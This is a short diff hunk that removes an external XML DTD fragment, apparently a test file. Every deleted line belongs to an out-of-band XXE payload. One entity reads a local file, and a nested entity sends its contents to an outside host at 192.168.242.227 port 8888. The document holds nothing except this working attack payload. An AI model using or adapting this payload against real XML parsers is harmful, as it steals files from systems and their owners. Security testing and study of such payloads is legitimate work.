@@ -1,3 +1,0 @@
-<!ENTITY % info SYSTEM "file:///C:/test/XXE.txt">
-<!ENTITY % http SYSTEM '<!ENTITY send SYSTEM "http://192.168.242.227:8888/r=%info;">'>
-%http;
